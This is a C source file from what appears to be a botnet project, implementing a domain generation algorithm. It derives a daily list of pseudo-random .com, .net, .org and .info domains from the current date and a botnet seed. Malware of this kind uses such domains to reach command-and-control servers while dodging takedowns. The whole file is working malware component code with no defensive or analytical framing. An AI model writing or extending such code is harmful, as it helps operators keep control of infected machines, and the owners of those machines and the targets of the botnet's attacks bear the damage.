#include "utils/dga.h"

#include "../../include/botnet.h"
#include <stdio.h>
#include <time.h>
#include <stdint.h>

// A simple hashing function (djb2) to create pseudo-randomness
static uint32_t hash_string(const char *str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    return hash;
}

// Generates a list of domains for the current day
int dga_generate_domains(char domains[MAX_DGA_DOMAINS][256]) {
    time_t t = time(NULL);
    struct tm *tm = gmtime(&t);

    char seed_buffer[512];
    char tlds[][5] = {".com", ".net", ".org", ".info"};

    printf("[*] Generating DGA domains for %d-%02d-%02d...\n", tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday);

    for (int i = 0; i < MAX_DGA_DOMAINS; i++) {
        // Create a unique seed for each domain based on date and index
        snprintf(seed_buffer, sizeof(seed_buffer), "%s-%d-%d-%d-%d", 
                 DGA_SEED, tm->tm_year, tm->tm_mon, tm->tm_mday, i);

        uint32_t hash = hash_string(seed_buffer);
        
        char *domain = domains[i];
        int domain_len = 8 + (hash % 8); // Domain length between 8 and 15 chars
        
        for (int j = 0; j < domain_len; j++) {
            domain[j] = 'a' + (hash % 26);
            hash = hash / 26;
            // A bit of mixing to make it less predictable
            if (hash == 0) {
                hash = hash_string(seed_buffer + j);
            }
        }
        domain[domain_len] = '\0';

        // Add a TLD
        strcat(domain, tlds[hash % 4]);
    }

    return MAX_DGA_DOMAINS;
}
